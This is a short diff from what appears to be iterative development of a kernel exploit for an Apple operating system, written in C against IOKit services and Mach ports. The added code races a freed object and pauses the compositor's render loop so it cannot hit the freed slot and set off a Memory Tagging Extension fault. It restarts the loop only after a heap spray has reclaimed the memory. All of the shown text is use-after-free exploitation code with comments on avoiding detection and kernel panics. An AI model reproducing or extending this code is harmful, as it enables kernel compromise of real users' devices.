@@ -19713,6 +19713,19 @@ new_modes:
             usleep(500000); /* let render loop stabilize 0.5s */
             rlog("  Render loop running, frames=%d\n", p13_render_frames);
 
+            /* r=230 strategy: pause render loop during race to prevent compositor
+             * from traversing the stale entry and triggering MTE fault. The compositor
+             * traversal happens independently at ~60fps and will panic the kernel if
+             * it hits a freed slot with wrong MTE tag. By stopping the render loop
+             * during the race and restarting after GEN1 spray, we ensure the compositor
+             * only sees our reclaimed spray objects, not the freed memory. */
+            if (rounds == 230) {
+                rlog("  r=230: Pausing render loop for safe race...\n");
+                p13_render_run = 0;
+                pthread_join(render_th, NULL);
+                rlog("  r=230: Render loop paused (frames=%d)\n", p13_render_frames);
+            }
+
             /* Stage C: race variants during render loop */
             if (rounds == 225) {
                 p13_reclaim_svc = svc13;
@@ -20101,6 +20114,17 @@ new_modes:
                 IOServiceClose(c13);
                 if (rounds != 229 && rounds != 230)
                     mach_port_deallocate(mach_task_self(), wp13);
+            }
+
+            /* r=230: restart render loop now that spray has reclaimed freed slots.
+             * The compositor will traverse our spray objects, not freed memory. */
+            if (rounds == 230) {
+                rlog("  r=230: Restarting render loop after spray (spray=%d)...\n", r229_spray_n);
+                p13_render_run = 1;
+                p13_render_frames = 0;
+                pthread_create(&render_th, NULL, p13_render_loop, NULL);
+                usleep(500000); /* let compositor traverse our spray objects */
+                rlog("  r=230: Render loop restarted, frames=%d\n", p13_render_frames);
             }
 
             /* Stop render loop */
